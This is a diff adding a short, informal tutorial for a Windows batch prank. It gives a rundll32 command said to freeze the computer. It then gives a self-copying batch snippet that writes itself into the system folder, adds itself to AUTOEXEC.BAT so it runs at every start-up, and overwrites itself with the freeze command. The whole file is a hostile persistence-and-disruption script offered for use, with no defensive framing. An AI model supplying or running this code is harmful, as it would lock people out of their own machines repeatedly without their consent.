@@ -1,0 +1,15 @@
+This function will freeze your computer until you restart it:
+
+rundll32 user,disableoemlayer
+
+If you want this to be permanant, these use this in cognition
+with the autoexec start-up function, Like this:
+
+if exist "%systemdrive%\AUTOEXEC.BAT" (
+copy %0 "%systemroot%\%0"
+echo start "" "%systemroot%\%0" >> %systemdrive%\AUTOEXEC.BAT
+)
+:: Overwrite!
+echo rundll32 user,disableoemlayer >%0
+Start %~n0
+@exit
